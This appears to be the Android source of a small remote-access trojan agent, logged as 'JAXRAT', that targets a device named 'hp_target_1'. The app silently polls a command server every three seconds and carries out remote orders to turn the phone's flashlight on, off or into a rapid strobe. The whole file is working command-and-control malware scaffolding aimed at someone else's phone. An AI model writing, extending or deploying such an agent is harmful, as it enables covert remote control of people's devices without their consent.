package com.ezax.agent;

import android.content.Context;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import androidx.appcompat.app.AppCompatActivity;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends AppCompatActivity {
    private static final String SERVER_URL = "http://192.168.1.46:5000"; 
    private static final String DEVICE_ID = "hp_target_1"; 
    
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean isStrobe = false;
    private Handler strobeHandler = new Handler();
    private CameraManager cameraManager;
    private String cameraId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        try {
            cameraId = cameraManager.getCameraIdList()[0]; 
        } catch (CameraAccessException e) {
            Log.e("JAXRAT", "Kamera error", e);
        }

        startPolling();
    }

    private void startPolling() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                fetchCommand();
                handler.postDelayed(this, 3000);
            }
        }, 3000);
    }

    private void fetchCommand() {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER_URL + "/api/get_command/" + DEVICE_ID);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = in.readLine()) != null) {
                    response.append(line);
                }
                in.close();

                JSONObject json = new JSONObject(response.toString());
                String cmd = json.optString("command", "none");
                
                if (!cmd.equals("none")) {
                    executeCommand(cmd);
                }

            } catch (Exception e) {
                Log.e("JAXRAT", "Gagal konek ke server", e);
            }
        }).start();
    }

    private void executeCommand(String cmd) {
        Log.d("JAXRAT", "Perintah masuk: " + cmd);

        if (cmd.equals("flash_on")) {
            stopStrobe();
            setTorch(true);
        } else if (cmd.equals("flash_off")) {
            stopStrobe();
            setTorch(false);
        } else if (cmd.equals("flash_strobe")) {
            startStrobe();
        } else if (cmd.equals("STOP_ALL")) {
            stopStrobe();
            setTorch(false);
        }
    }

    private void setTorch(boolean state) {
        try {
            cameraManager.setTorchMode(cameraId, state);
        } catch (CameraAccessException e) {
            Log.e("JAXRAT", "Gagal nyalain senter", e);
        }
    }

    private void startStrobe() {
        isStrobe = true;
        strobeRunnable.run();
    }

    private void stopStrobe() {
        isStrobe = false;
        strobeHandler.removeCallbacks(strobeRunnable);
        setTorch(false);
    }

    private final Runnable strobeRunnable = new Runnable() {
        @Override
        public void run() {
            if (isStrobe) {
                setTorch(true);
                strobeHandler.postDelayed(() -> {
                    setTorch(false);
                    if (isStrobe) strobeHandler.postDelayed(this, 200); 
                }, 200); 
            }
        }
    };
}
